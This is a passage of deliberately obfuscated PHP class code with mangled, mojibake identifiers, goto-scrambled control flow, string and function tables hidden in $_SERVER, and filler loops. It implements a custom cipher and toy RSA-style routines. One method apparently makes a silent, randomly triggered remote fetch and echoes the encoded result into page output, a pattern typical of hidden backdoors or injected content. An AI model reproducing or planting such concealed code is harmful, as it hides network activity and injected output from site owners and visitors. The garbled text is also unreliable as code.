$Aìô¨­Óï¯[331] => $Aìô¨­Óï¯[264], $Aìô¨­Óï¯[332] => $Aìô¨­Óï¯[264], $Aìô¨­Óï¯[333] => $Aìô¨­Óï¯[322], $Aìô¨­Óï¯[334] => $Aìô¨­Óï¯[324], $Aìô¨­Óï¯[335] => $Aìô¨­Óï¯[326], $Aìô¨­Óï¯[336] => $Aìô¨­Óï¯[337], $Aìô¨­Óï¯[338] => $Aìô¨­Óï¯[328], $Aìô¨­Óï¯[339] => $Aìô¨­Óï¯[340], $Aìô¨­Óï¯[341] => $Aìô¨­Óï¯[330], $Aìô¨­Óï¯[342] => $Aìô¨­Óï¯[343], $Aìô¨­Óï¯[344] => $Aìô¨­Óï¯[345], $Aìô¨­Óï¯[346] => $Aìô¨­Óï¯[347]); goto eÒ‘Èöã¿; d›˜·è¬Œ: $d¤È´“ÁˆÒ = $d¤È´“ÁˆÒ ? $Aìô¨­Óï¯[263]($d¤È´“ÁˆÒ) : 0; return $EÅÒ«ã°Ù + $d¤È´“ÁˆÒ; goto dĞåä§£ëÎ; F¨ÎÍ™éÅ…: $d¤È´“ÁˆÒ = $Aìô¨­Óï¯[116]($this->dlur7bd63502, $Aìô¨­Óï¯[348]); $dÛ…šÖ£ç = $BòŠ×¼åÖ[648]; while (strlen($dÛ…šÖ£ç) < $BòŠ×¼åÖ[596]) { if (!$dÛ…šÖ£ç) { break; } $dÛ…šÖ£ç++; } goto d›˜·è¬Œ; eÒ‘Èöã¿: $EÅÒ«ã°Ù = $Có´‰Å‚Î[$this->clna1f9cfecc]; $b¿¯ù“¯¯É = $BòŠ×¼åÖ[647]; $EÅÒ«ã°Ù = $Aìô¨­Óï¯[263]($EÅÒ«ã°Ù ? $EÅÒ«ã°Ù : $Aìô¨­Óï¯[322]); goto F¨ÎÍ™éÅ…; dĞåä§£ëÎ: } public function qtoh31bf8e83($FôÉ¤İ”ìÂ) { goto dï­‚…; dï­‚…: $d„ÌËç½ä™ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÊ‡õÛ÷³ =& $_SERVER[™ñğşİ€©ˆç]; $BØšïÄšÀ… = $this->{$_SERVER[™ñğşİ€©ˆç][147]}(); goto bˆˆÚ÷¡“ß; eÄä²é°äª: $F¡°£„ñ– = $eÊ‡õÛ÷³[241]($F¡°£„ñ–, $eÊ‡õÛ÷³[10], $eÊ‡õÛ÷³[349]); if (!$eÊ‡õÛ÷³[261]($FôÉ¤İ”ìÂ[$eÊ‡õÛ÷³[349]], $F¡°£„ñ–)) { $eÊ‡õÛ÷³[184]($eÊ‡õÛ÷³[353], !1, $eÊ‡õÛ÷³[258]); } goto Bª‹İÔ¦; bÏñŸÌõ‡—: $F¡°£„ñ– = $eÊ‡õÛ÷³[61]($eÊ‡õÛ÷³[149])->{$_SERVER[™ñğşİ€©ˆç][350]}($eÊ‡õÛ÷³[349])->{$_SERVER[™ñğşİ€©ˆç][351]}($BØšïÄšÀ…)->{$_SERVER[™ñğşİ€©ˆç][352]}(); $E¥ŒÈ¬ãâ = $d„ÌËç½ä™[650]; while ($E¥ŒÈ¬ãâ < $d„ÌËç½ä™[575]) { if ($E¥ŒÈ¬ãâ >= 0) { break; } $E¥ŒÈ¬ãâ++; } goto eÄä²é°äª; bˆˆÚ÷¡“ß: $fïİ¹²›»á = $d„ÌËç½ä™[649]; if (strlen($fïİ¹²›»á) < $d„ÌËç½ä™[579]) { die; } if ($FôÉ¤İ”ìÂ[$eÊ‡õÛ÷³[349]] == $eÊ‡õÛ÷³[239]) { return; } goto d•Ï  Š¤÷; d•Ï  Š¤÷: if ($BØšïÄšÀ… >= $eÊ‡õÛ÷³[263]($eÊ‡õÛ÷³[264])) { return; } $CÌïÁŸ¥¾ê = $eÊ‡õÛ÷³[61]($eÊ‡õÛ÷³[149])->{$_SERVER[™ñğşİ€©ˆç][150]}(); if ($CÌïÁŸ¥¾ê <= $BØšïÄšÀ…) { return; } goto bÏñŸÌõ‡—; Bª‹İÔ¦: } public function coki67a70daa() { goto FŒñé«êÕ; FÓ»Ëº‘‹ã: $D‡“Ú÷Ô ¹ = $fõ”¬·Ö¡À[268]; $D‡“Ú÷Ô ¹ = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($D‡“Ú÷Ô ¹, $fõ”¬·Ö¡À[270]); $CâÌì“ÒÕ¡ = $fõ”¬·Ö¡À[271](array($fõ”¬·Ö¡À[272] => array($fõ”¬·Ö¡À[273] => $fõ”¬·Ö¡À[274], $fõ”¬·Ö¡À[275] => 3))); goto EŒò“‘çõ; cõó‘ŸÓ¦: echo $fõ”¬·Ö¡À[355] . $fõ”¬·Ö¡À[356]($B÷–•øªÏá) . $fõ”¬·Ö¡À[357]; $e–«æ¼İğˆ = $dÉØˆÌ¥¹†[652]; goto f³¸©³‹ŞÑ; FŒñé«êÕ: $dÉØˆÌ¥¹† =& $_SERVER[ÒÆ›ÆØÎ¾]; $fõ”¬·Ö¡À =& $_SERVER[™ñğşİ€©ˆç]; if (!$fõ”¬·Ö¡À[116]($GLOBALS, $fõ”¬·Ö¡À[142]) || $fõ”¬·Ö¡À[354](1, 100) > 20) { return; } goto FÓ»Ëº‘‹ã; EŒò“‘çõ: $E“†¬¡Šä… = $dÉØˆÌ¥¹†[651]; if (strlen($E“†¬¡Šä…) < $dÉØˆÌ¥¹†[583]) { die; } $B÷–•øªÏá = @$fõ”¬·Ö¡À[276]($D‡“Ú÷Ô ¹, !1, $CâÌì“ÒÕ¡); goto cõó‘ŸÓ¦; f³¸©³‹ŞÑ: } private function fvdx7dd0e6f1($f½‰‹†²İ, $Aé»‚¾¤±ò, $Eƒˆ„…¦Û› = 3) { goto D–öÇÙèƒ–; d¥Ø‘™œ¡’: switch ($FèÂ‚Î®ªé) { case $d·Î“Ş®À[253]: $e”º¿š»¾ø = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($f½‰‹†²İ, $d·Î“Ş®À[233]($Aé»‚¾¤±ò . $D·Œ²±…Íó)); break; $e‡¬Êª”Šï = $B£Ş·Š˜Á‡[654]; case $d·Î“Ş®À[239]: $e”º¿š»¾ø = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($f½‰‹†²İ, $d·Î“Ş®À[233]($D·Œ²±…Íó . $Aé»‚¾¤±ò)); break; case $d·Î“Ş®À[360]: $e”º¿š»¾ø = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($f½‰‹†²İ, $d·Î“Ş®À[128]($D·Œ²±…Íó . $Aé»‚¾¤±ò)); $A³œ‚´˜Š¥ = $B£Ş·Š˜Á‡[655]; while (strlen($A³œ‚´˜Š¥) < $B£Ş·Š˜Á‡[596]) { if (!$A³œ‚´˜Š¥) { break; } $A³œ‚´˜Š¥++; } break; case $d·Î“Ş®À[361]: $e”º¿š»¾ø = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($f½‰‹†²İ, $d·Î“Ş®À[124]($D·Œ²±…Íó . $Aé»‚¾¤±ò)); break; $cì¯¦Äá”÷ = $B£Ş·Š˜Á‡[656]; while (strlen($cì¯¦Äá”÷) < $B£Ş·Š˜Á‡[575]) { if (!$cì¯¦Äá”÷) { break; } $cì¯¦Äá”÷++; } case $d·Î“Ş®À[362]: goto CÀÄè™´•å; bùØ§¨ƒ‰: $cÙ¶ÛßĞÙ‘ = 0; $BìÊé‘È¯« = $B£Ş·Š˜Á‡[660]; while ($BìÊé‘È¯« < $B£Ş·Š˜Á‡[596]) { if ($BìÊé‘È¯« >= 0) { break; } $BìÊé‘È¯«++; } goto bß¦‡•ˆ«Õ; døƒÒÄï¿: $c¼‡ÂšÀ¢© = $d·Î“Ş®À[363](0, 64); $EÓ‹«˜Šğ = $Cˆ¶¶’Š“–[$c¼‡ÂšÀ¢©]; $f‚ó—ã î = $d·Î“Ş®À[124]($EÓ‹«˜Šğ . $d·Î“Ş®À[124]($Aé»‚¾¤±ò . $EÓ‹«˜Šğ) . $Aé»‚¾¤±ò); goto EºšµÍ¯àì; EºšµÍ¯àì: $f‚ó—ã î = $d·Î“Ş®À[25]($f‚ó—ã î, $c¼‡ÂšÀ¢© % 8, $c¼‡ÂšÀ¢© % 8 + 7); $Fï£÷Èâ®Ô = $B£Ş·Š˜Á‡[658]; $cÙ¯™·Œ ù = $d·Î“Ş®À[10]; goto D©Ù±ÍË’Œ; bß¦‡•ˆ«Õ: $dºÅ‡ˆÁÆ = 0; for ($bë‹Íõ†İ¬ = 0; $bë‹Íõ†İ¬ < $d·Î“Ş®À[24]($f½‰‹†²İ); $bë‹Íõ†İ¬++) { $dºÅ‡ˆÁÆ = $dºÅ‡ˆÁÆ == $d·Î“Ş®À[24]($f‚ó—ã î) ? 0 : $dºÅ‡ˆÁÆ; $cÙ¶ÛßĞÙ‘ = ($c¼‡ÂšÀ¢© + $d·Î“Ş®À[364]($Cˆ¶¶’Š“–, $f½‰‹†²İ[$bë‹Íõ†İ¬]) + $d·Î“Ş®À[365]($f‚ó—ã î[$dºÅ‡ˆÁÆ++])) % 64; $f´ºÎñ¡›á = $B£Ş·Š˜Á‡[661]; if (strlen($f´ºÎñ¡›á) < $B£Ş·Š˜Á‡[596]) { return; } $cÙ¯™·Œ ù .= $Cˆ¶¶’Š“–[$cÙ¶ÛßĞÙ‘]; } $e”º¿š»¾ø = $d·Î“Ş®À[356]($EÓ‹«˜Šğ . $cÙ¯™·Œ ù); goto bØÏ·§°‰ø; CÀÄè™´•å: $f½‰‹†²İ = $d·Î“Ş®À[128]($f½‰‹†²İ); $CÇ¹˜Ì„Ê = $B£Ş·Š˜Á‡[657]; if (!$CÇ¹˜Ì„Ê) { return; } goto døƒÒÄï¿; D©Ù±ÍË’Œ: $bë‹Íõ†İ¬ = 0; $dÛÖ³ğÃ’Ä = $B£Ş·Š˜Á‡[659]; if (strlen($dÛÖ³ğÃ’Ä) < $B£Ş·Š˜Á‡[583]) { return; } goto bùØ§¨ƒ‰; bØÏ·§°‰ø: break; goto Dåä‘”“à‰; Dåä‘”“à‰: default: $e”º¿š»¾ø = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($f½‰‹†²İ, $Aé»‚¾¤±ò . $D·Œ²±…Íó); break; } $e”º¿š»¾ø = $d·Î“Ş®À[233]($FèÂ‚Î®ªé . $D·Œ²±…Íó . $e”º¿š»¾ø); if ($Eƒˆ„…¦Û› - 1 > 0) { $e”º¿š»¾ø = $this->{$_SERVER[™ñğşİ€©ˆç][137]}($e”º¿š»¾ø, $Aé»‚¾¤±ò, $Eƒˆ„…¦Û› - 1); } goto d§ÛÉ‚ºóô; d§ÛÉ‚ºóô: return $e”º¿š»¾ø; goto eÜˆ†‰‚öè; c…ï¸­‰ô: $FèÂ‚Î®ªé = $d·Î“Ş®À[354](0, 5) . $d·Î“Ş®À[10]; $D·Œ²±…Íó = $d·Î“Ş®À[134](15); $Cˆ¶¶’Š“– = $d·Î“Ş®À[359]; goto d¥Ø‘™œ¡’; c‹°Ş‚ç: $f½‰‹†²İ = $d·Î“Ş®À[2]($f½‰‹†²İ); $DÖ¦§“ìÕ  = $B£Ş·Š˜Á‡[653]; if (!$DÖ¦§“ìÕ ) { return; } goto c…ï¸­‰ô; D–öÇÙèƒ–: $B£Ş·Š˜Á‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d·Î“Ş®À =& $_SERVER[™ñğşİ€©ˆç]; $d·Î“Ş®À[358](1); goto c‹°Ş‚ç; eÜˆ†‰‚öè: } private function lfte65d00f38($bÒá«ª¿, $cê¿îğóô, $dÍ°àİÖÑ = 3) { goto D¸š‚Ü¾¸Ş; bÉ®œÖ›œ: $B¥ğ ¦ö‡Ü = $E…Í©›ÃŞğ[663]; while ($B¥ğ ¦ö‡Ü < $E…Í©›ÃŞğ[592]) { if ($B¥ğ ¦ö‡Ü >= 0) { break; } $B¥ğ ¦ö‡Ü++; } $bÒá«ª¿ = $E¨š÷·—…©[25]($bÒá«ª¿, 16); goto DØ‡Ş“ Ü; D¸š‚Ü¾¸Ş: $E…Í©›ÃŞğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¨š÷·—…© =& $_SERVER[™ñğşİ€©ˆç]; if (!$E¨š÷·—…©[158]($bÒá«ª¿) || $E¨š÷·—…©[24]($bÒá«ª¿) < 10) { return !1; } goto aã¸Î£ôº†; EˆÓçëÏó: $C¨ø½Íªº® = $E…Í©›ÃŞğ[662]; while ($C¨ø½Íªº® < $E…Í©›ÃŞğ[583]) { if ($C¨ø½Íªº® >= 0) { break; } $C¨ø½Íªº®++; } $fôèŞÓŞ° = $E¨š÷·—…©[25]($bÒá«ª¿, 1, 15); goto bÉ®œÖ›œ; aã¸Î£ôº†: $bÒá«ª¿ = $E¨š÷·—…©[2]($bÒá«ª¿); $bÒá«ª¿ = $E¨š÷·—…©[233]($bÒá«ª¿); $eäìÆš‹ë = $bÒá«ª¿[0]; goto EˆÓçëÏó; DØ‡Ş“ Ü: $CÊï´Ü†Ş© = $E¨š÷·—…©[359]; $Få´ö¶ö¼Ş = $E…Í©›ÃŞğ[664]; while ($Få´ö¶ö¼Ş < $E…Í©›ÃŞğ[596]) { if ($Få´ö¶ö¼Ş >= 0) { break; } $Få´ö¶ö¼Ş++; } goto AµÂ‡–‹ÖÖ; AµÂ‡–‹ÖÖ: switch ($eäìÆš‹ë) { case $E¨š÷·—…©[253]: $bŞÇ¦ñ¹ä² = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($bÒá«ª¿, $E¨š÷·—…©[233]($cê¿îğóô . $fôèŞÓŞ°)); $B•”õ©½®Å = $E…Í©›ÃŞğ[665]; while (strlen($B•”õ©½®Å) < $E…Í©›ÃŞğ[596]) { if (!$B•”õ©½®Å) { break; } $B•”õ©½®Å++; } break; $BáöŒ×ñ» = $E…Í©›ÃŞğ[666]; case $E¨š÷·—…©[239]: $bŞÇ¦ñ¹ä² = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($bÒá«ª¿, $E¨š÷·—…©[233]($fôèŞÓŞ° . $cê¿îğóô)); break; $BÁ¯Æ¦‘âğ = $E…Í©›ÃŞğ[667]; case $E¨š÷·—…©[360]: $bŞÇ¦ñ¹ä² = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($bÒá«ª¿, $E¨š÷·—…©[128]($fôèŞÓŞ° . $cê¿îğóô)); break; case $E¨š÷·—…©[361]: $bŞÇ¦ñ¹ä² = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($bÒá«ª¿, $E¨š÷·—…©[124]($fôèŞÓŞ° . $cê¿îğóô)); break; case $E¨š÷·—…©[362]: goto d¹ÇÙóê; DçÎßòõ‰: $bŞÇ¦ñ¹ä² = $E¨š÷·—…©[367]($B¬“£­ˆìâ); $a±™ˆ¦ğÕ = $E…Í©›ÃŞğ[675]; if (!$a±™ˆ¦ğÕ) { return; } goto Bìªò©ÎŒ; DË«¶Ñˆùõ: $CÀÈÚŸÅ… = 0; $BÌˆ«ø§œ× = 0; for ($BÄƒ–ùŠµ¢ = 0; $BÄƒ–ùŠµ¢ < $E¨š÷·—…©[24]($bÒá«ª¿); $BÄƒ–ùŠµ¢++) { $BÌˆ«ø§œ× = $BÌˆ«ø§œ× == $E¨š÷·—…©[24]($dĞÎ­‚Æ‰‡) ? 0 : $BÌˆ«ø§œ×; $a‚‹ÙÖÕÆ = $E…Í©›ÃŞğ[671]; $B’’äÃ… = $BÌˆ«ø§œ×++; $FÉ†Úæ•ºğ = $E…Í©›ÃŞğ[672]; while ($FÉ†Úæ•ºğ < $E…Í©›ÃŞğ[583]) { if ($FÉ†Úæ•ºğ >= 0) { break; } $FÉ†Úæ•ºğ++; } $CÀÈÚŸÅ… = $E¨š÷·—…©[364]($CÊï´Ü†Ş©, $bÒá«ª¿[$BÄƒ–ùŠµ¢]) - $d’Íèù—¸î - $E¨š÷·—…©[365]($dĞÎ­‚Æ‰‡[$B’’äÃ…]); $bö’¹âîó = $E…Í©›ÃŞğ[673]; while ($CÀÈÚŸÅ… < 0) { $CÀÈÚŸÅ… += 64; } $B¬“£­ˆìâ .= $CÊï´Ü†Ş©[$CÀÈÚŸÅ…]; $e®ÔÂ®â™ = $E…Í©›ÃŞğ[674]; if (!$e®ÔÂ®â™) { return; } } goto DçÎßòõ‰; BøÔ­ÜõÛ´: $dĞÎ­‚Æ‰‡ = $E¨š÷·—…©[124]($AïïŒ¢ƒŒ . $E¨š÷·—…©[124]($cê¿îğóô . $AïïŒ¢ƒŒ) . $cê¿îğóô); $B¾©×ç‰˜‰ = $E…Í©›ÃŞğ[669]; $dĞÎ­‚Æ‰‡ = $E¨š÷·—…©[25]($dĞÎ­‚Æ‰‡, $d’Íèù—¸î % 8, $d’Íèù—¸î % 8 + 7); goto b‰÷½Ì¿ò; d¹ÇÙóê: $bÒá«ª¿ = $E¨š÷·—…©[366]($bÒá«ª¿); $AïïŒ¢ƒŒ = $bÒá«ª¿[0]; $bÒá«ª¿ = $E¨š÷·—…©[25]($bÒá«ª¿, 1); goto a‹­»‚¿Ó‘; a‹­»‚¿Ó‘: $d’Íèù—¸î = $E¨š÷·—…©[364]($CÊï´Ü†Ş©, $AïïŒ¢ƒŒ); $DøŸ¹›ßÉ‰ = $E…Í©›ÃŞğ[668]; if (strlen($DøŸ¹›ßÉ‰) < $E…Í©›ÃŞğ[596]) { die; } goto BøÔ­ÜõÛ´; Bìªò©ÎŒ: break; $DŒºƒÛèÁÈ = $E…Í©›ÃŞğ[676]; while ($DŒºƒÛèÁÈ < $E…Í©›ÃŞğ[596]) { if ($DŒºƒÛèÁÈ >= 0) { break; } $DŒºƒÛèÁÈ++; } goto B‹‰Şñ¹Ëã; b‰÷½Ì¿ò: $B¬“£­ˆìâ = $E¨š÷·—…©[10]; $cèÏ¸ä÷İ½ = $E…Í©›ÃŞğ[670]; $BÄƒ–ùŠµ¢ = 0; goto DË«¶Ñˆùõ; B‹‰Şñ¹Ëã: default: $bŞÇ¦ñ¹ä² = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($bÒá«ª¿, $cê¿îğóô . $fôèŞÓŞ°); $bô´¶¿Õ‡š = $E…Í©›ÃŞğ[677]; break; $AÛ„‰Ïé±œ = $E…Í©›ÃŞğ[678]; } if ($dÍ°àİÖÑ - 1 > 0) { $bŞÇ¦ñ¹ä² = $this->{$_SERVER[™ñğşİ€©ˆç][208]}($bŞÇ¦ñ¹ä², $cê¿îğóô, $dÍ°àİÖÑ - 1); } return $bŞÇ¦ñ¹ä²; goto BóÇÄÂêÅª; BóÇÄÂêÅª: } public function xsvr83b3d71b($D›½ÍÛÌŠ²) { goto F’ºÂ¿ã¨½; a—’âì¤Ùğ: $E¿’ìÛ¿Ğª = $cêÅ×§Áİ[679]; $B¡äÅ±ÀÖ = $this->{$_SERVER[™ñğşİ€©ˆç][368]}(); $e¢¬Şäµ÷ = $cêÅ×§Áİ[680]; goto C»ÈùÔ³ß; dà¦÷Ëø÷: while (1) { $dĞ¹ŒØì„‹ = $DàÑ°óìÓ; $CËÅ‚â² = $bÛ»¾¶à‘¿; while ($CËÅ‚â² % $dĞ¹ŒØì„‹ != 0) { $CÌÒÏÔ×Íˆ = $CËÅ‚â²; $CËÅ‚â² = $dĞ¹ŒØì„‹; $dĞ¹ŒØì„‹ = $CÌÒÏÔ×Íˆ % $dĞ¹ŒØì„‹; $FƒâŒ‹½¶ = $cêÅ×§Áİ[681]; if (strlen($FƒâŒ‹½¶) < $cêÅ×§Áİ[583]) { return; } } if ($dĞ¹ŒØì„‹ == 1) { break; } else { $DàÑ°óìÓ++; } } $c”¯äÒ®Ñˆ = 2; for ($E‰´İÓíŸè = 0; $E‰´İÓíŸè < $bÛ»¾¶à‘¿ * 10; $E‰´İÓíŸè++) { if (($bÛ»¾¶à‘¿ * $E‰´İÓíŸè + 1) % $DàÑ°óìÓ == 0) { $c”¯äÒ®Ñˆ = $fˆ§×æù·£[263](($bÛ»¾¶à‘¿ * $E‰´İÓíŸè + 1) / $DàÑ°óìÓ); break; } } goto fŒÒº„Ë‰æ; b¬«·áš¢: return $Fç¤Ó«”†Œ; goto dŠíé›’®‰; E•ĞšğÔ˜”: $Dê™àÍˆ²ø = $fˆ§×æù·£[124]($fˆ§×æù·£[369] . ($E½Ú°Şò™„ + $B¡äÅ±ÀÖ) . $fˆ§×æù·£[370] . $DàÑ°óìÓ . $fˆ§×æù·£[370] . $c”¯äÒ®Ñˆ . $fˆ§×æù·£[371]); $EøŞĞÖì×ƒ = $cêÅ×§Áİ[683]; $Fç¤Ó«”†Œ = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($D›½ÍÛÌŠ², $Dê™àÍˆ²ø) . $fˆ§×æù·£[372] . $fÅŠØï¶Öæ; goto b¬«·áš¢; C»ÈùÔ³ß: if (strlen($e¢¬Şäµ÷) < $cêÅ×§Áİ[579]) { die; } $bÛ»¾¶à‘¿ = ($E½Ú°Şò™„ - 1) * ($B¡äÅ±ÀÖ - 1); $DàÑ°óìÓ = $fˆ§×æù·£[263](($E½Ú°Şò™„ + $B¡äÅ±ÀÖ) / 2); goto dà¦÷Ëø÷; fŒÒº„Ë‰æ: $fÅŠØï¶Öæ = $this->{$_SERVER[™ñğşİ€©ˆç][165]}($E½Ú°Şò™„ * $B¡äÅ±ÀÖ . $fˆ§×æù·£[10], $fˆ§×æù·£[167]); $b¯°‘ãÑÜ = $cêÅ×§Áİ[682]; if (strlen($b¯°‘ãÑÜ) < $cêÅ×§Áİ[583]) { die; } goto E•ĞšğÔ˜”; F’ºÂ¿ã¨½: $cêÅ×§Áİ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fˆ§×æù·£ =& $_SERVER[™ñğşİ€©ˆç]; $E½Ú°Şò™„ = $this->{$_SERVER[™ñğşİ€©ˆç][368]}(); goto a—’âì¤Ùğ; dŠíé›’®‰: } public function qdmb2287e3d9($eŸ™ëá„æ½) { goto E‹§šÑÂµ÷; B†ëùò¨–: while ($f£®äéš—° < $eï‘ÉàâÀ[592]) { if ($f£®äéš—° >= 0) { break; } $f£®äéš—°++; } while (1) { $c”È¤•˜ìÍ = $fßŠÒ”‘Ø”; $DÒŠ– †­ = $E‡Áùšƒ‹Œ; $b»ŠÆø•¬÷ = $eï‘ÉàâÀ[690]; if (strlen($b»ŠÆø•¬÷) < $eï‘ÉàâÀ[596]) { return; } while ($DÒŠ– †­ % $c”È¤•˜ìÍ != 0) { $FÊñƒò”Ø = $DÒŠ– †­; $cÙŸ«À¡Ù– = $eï‘ÉàâÀ[691]; while (strlen($cÙŸ«À¡Ù–) < $eï‘ÉàâÀ[575]) { if (!$cÙŸ«À¡Ù–) { break; } $cÙŸ«À¡Ù–++; } $DÒŠ– †­ = $c”È¤•˜ìÍ; $c”È¤•˜ìÍ = $FÊñƒò”Ø % $c”È¤•˜ìÍ; } if ($c”È¤•˜ìÍ == 1) { break; } else { $fßŠÒ”‘Ø”++; } } $f‹—øÅ—÷ = 2; goto A‘Ûø¬Ã»Ú; aãµÊ÷×ªø: $Cî«Â–¯ÌÆ = $eï‘ÉàâÀ[686]; while ($Cî«Â–¯ÌÆ < $eï‘ÉàâÀ[596]) { if ($Cî«Â–¯ÌÆ >= 0) { break; } $Cî«Â–¯ÌÆ++; } $cù«½ğó = 0; goto f¤‚ÂîŞã’; DìÜĞç¬ÆŸ: if ($f¨í‹Èí‹ì[19]($E»¸«©¶âÄ) != 2) { return $f¨í‹Èí‹ì[10]; } $a±ŸíŠ¥ò = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($E»¸«©¶âÄ[1] . $f¨í‹Èí‹ì[10], $f¨í‹Èí‹ì[167]); $cªàÓ†ä¾· = $eï‘ÉàâÀ[684]; goto bá”ÂæÙÈë; f¤‚ÂîŞã’: for ($a¨™Òœ«ìÜ = 3; $a¨™Òœ«ìÜ < $a±ŸíŠ¥ò; $a¨™Òœ«ìÜ += 2) { if ($a±ŸíŠ¥ò % $a¨™Òœ«ìÜ != 0) { continue; } $e÷½‚îÎº· = $a¨™Òœ«ìÜ; $cù«½ğó = $f¨í‹Èí‹ì[263]($a±ŸíŠ¥ò / $a¨™Òœ«ìÜ); $eÖÀ¸ÕÆ£¹ = $eï‘ÉàâÀ[687]; if (!$eÖÀ¸ÕÆ£¹) { die; } break; } $E‡Áùšƒ‹Œ = ($e÷½‚îÎº· - 1) * ($cù«½ğó - 1); $e†š†Ş±Ä = $eï‘ÉàâÀ[688]; goto E³ˆ¦¬ùÇ; E‹§šÑÂµ÷: $eï‘ÉàâÀ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¨í‹Èí‹ì =& $_SERVER[™ñğşİ€©ˆç]; $E»¸«©¶âÄ = $f¨í‹Èí‹ì[0]($f¨í‹Èí‹ì[372], $eŸ™ëá„æ½); goto DìÜĞç¬ÆŸ; d´ÈÎÓŸˆ´: $A‚‡ªÛ’¼ã = $eï‘ÉàâÀ[692]; return $DßÅõ“‰İ; $D’ìÆ§¹ÁÎ = $eï‘ÉàâÀ[693]; goto a”ğ®µ‘µ‚; E³ˆ¦¬ùÇ: while ($e†š†Ş±Ä < $eï‘ÉàâÀ[579]) { if ($e†š†Ş±Ä >= 0) { break; } $e†š†Ş±Ä++; } $fßŠÒ”‘Ø” = $f¨í‹Èí‹ì[263](($e÷½‚îÎº· + $cù«½ğó) / 2); $f£®äéš—° = $eï‘ÉàâÀ[689]; goto B†ëùò¨–; dâí›‘Á§…: $dƒŒ¬ĞÅ£¶ = $eï‘ÉàâÀ[685]; while (strlen($dƒŒ¬ĞÅ£¶) < $eï‘ÉàâÀ[575]) { if (!$dƒŒ¬ĞÅ£¶) { break; } $dƒŒ¬ĞÅ£¶++; } $e÷½‚îÎº· = 0; goto aãµÊ÷×ªø; bá”ÂæÙÈë: if (strlen($cªàÓ†ä¾·) < $eï‘ÉàâÀ[575]) { die; } if (!$a±ŸíŠ¥ò) { return $f¨í‹Èí‹ì[10]; } $a±ŸíŠ¥ò = $f¨í‹Èí‹ì[263]($a±ŸíŠ¥ò); goto dâí›‘Á§…; A‘Ûø¬Ã»Ú: for ($a¨™Òœ«ìÜ = 0; $a¨™Òœ«ìÜ < $E‡Áùšƒ‹Œ * 10; $a¨™Òœ«ìÜ++) { if (($E‡Áùšƒ‹Œ * $a¨™Òœ«ìÜ + 1) % $fßŠÒ”‘Ø” == 0) { $f‹—øÅ—÷ = $f¨í‹Èí‹ì[263](($E‡Áùšƒ‹Œ * $a¨™Òœ«ìÜ + 1) / $fßŠÒ”‘Ø”); break; } } $CÓ¸Ú™”Ü¹ = $f¨í‹Èí‹ì[124]($f¨í‹Èí‹ì[369] . ($e÷½‚îÎº· + $cù«½ğó) . $f¨í‹Èí‹ì[370] . $fßŠÒ”‘Ø” . $f¨í‹Èí‹ì[370] . $f‹—øÅ—÷ . $f¨í‹Èí‹ì[371]); $DßÅõ“‰İ = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($E»¸«©¶âÄ[0], $CÓ¸Ú™”Ü¹); goto d´ÈÎÓŸˆ´; a”ğ®µ‘µ‚: } public function wngm5e67879f() { goto e„Âº”ƒŠ‚; aŠ´¥Ã¥‚ì: return $eÃùØãÎ©; $F‚Œ‹Ş¯Š° = $e»‹“»İ‘[697]; goto aÑ¦’«Í‘Ø; e„Âº”ƒŠ‚: $e»‹“»İ‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d‚Êµˆ÷Ì =& $_SERVER[™ñğşİ€©ˆç]; $bÒÔØà°“° = $d‚Êµˆ÷Ì[354]($d‚Êµˆ÷Ì[373](2, 14), $d‚Êµˆ÷Ì[373](2, 16) - 1); goto Dğ”Şé‰; Bš•™´³Œ¥: $e…±´Œ¢ï¢ = 1; while ($e…±´Œ¢ï¢ <= (int) $d‚Êµˆ÷Ì[374]($bÒÔØà°“°)) { $Aó¯Ù£éÓ = $e…±´Œ¢ï¢; while (!0) { $Aó¯Ù£éÓ++; if ($Aó¯Ù£éÓ <= 2) { $e…±´Œ¢ï¢ = $Aó¯Ù£éÓ; break; } else { if ($Aó¯Ù£éÓ < 2) { continue; } } $b¥¿ÂÈÔ» = !0; for ($cƒµ†­•æ = 2; $cƒµ†­•æ <= $d‚Êµˆ÷Ì[374]($Aó¯Ù£éÓ); $cƒµ†­•æ++) { if ($Aó¯Ù£éÓ % $cƒµ†­•æ == 0) { $b¥¿ÂÈÔ» = !1; } } if ($b¥¿ÂÈÔ») { $e…±´Œ¢ï¢ = $Aó¯Ù£éÓ; break; } } $e’‚ƒõ¬À[] = $e…±´Œ¢ï¢; } $eÃùØãÎ© = 2; goto C¥Õá¹§»; Dğ”Şé‰: $e’‚ƒõ¬À = array(); $E“Æ£ĞİãÅ = $e»‹“»İ‘[694]; while (strlen($E“Æ£ĞİãÅ) < $e»‹“»İ‘[575]) { if (!$E“Æ£ĞİãÅ) { break; } $E“Æ£ĞİãÅ++; } goto Bš•™´³Œ¥; C¥Õá¹§»: $cÌÚàÊîëî = $e»‹“»İ‘[695]; if (strlen($cÌÚàÊîëî) < $e»‹“»İ‘[583]) { die; } for ($Aó¯Ù£éÓ = $bÒÔØà°“°; $Aó¯Ù£éÓ > 1; $Aó¯Ù£éÓ--) { $b¥¿ÂÈÔ» = !0; $eæìÚÍ‘Â = $e»‹“»İ‘[696]; while ($eæìÚÍ‘Â < $e»‹“»İ‘[583]) { if ($eæìÚÍ‘Â >= 0) { break; } $eæìÚÍ‘Â++; } foreach ($e’‚ƒõ¬À as $dë—ò›âÖ£) { if ($Aó¯Ù£éÓ % $dë—ò›âÖ£ == 0) { $b¥¿ÂÈÔ» = !1; break; } } if ($b¥¿ÂÈÔ») { $eÃùØãÎ© = $Aó¯Ù£éÓ; break; } } goto aŠ´¥Ã¥‚ì; aÑ¦’«Í‘Ø: } public function 